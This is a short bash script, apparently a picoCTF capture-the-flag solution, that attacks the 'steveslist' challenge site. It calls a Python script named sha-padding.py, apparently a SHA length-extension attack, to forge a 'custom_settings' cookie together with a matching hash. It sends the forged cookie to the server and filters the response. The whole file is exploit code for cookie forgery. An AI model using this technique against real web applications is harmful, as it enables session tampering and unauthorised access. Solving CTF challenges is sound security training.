#!/bin/bash

function much_strip() {
   grep "$2" <<< "$1" | cut -d ':' -f2 | sed -e 's/ //'
}

VERY_HACK="$(python2 sha-padding.py)"

echo $(much_strip "$(http http://steveslist.picoctf.com/ "Cookie: custom_settings=$(much_strip "$VERY_HACK" urlencoded); custom_settings_hash=$(much_strip "$VERY_HACK" 'new sig')")" 'POST hi')
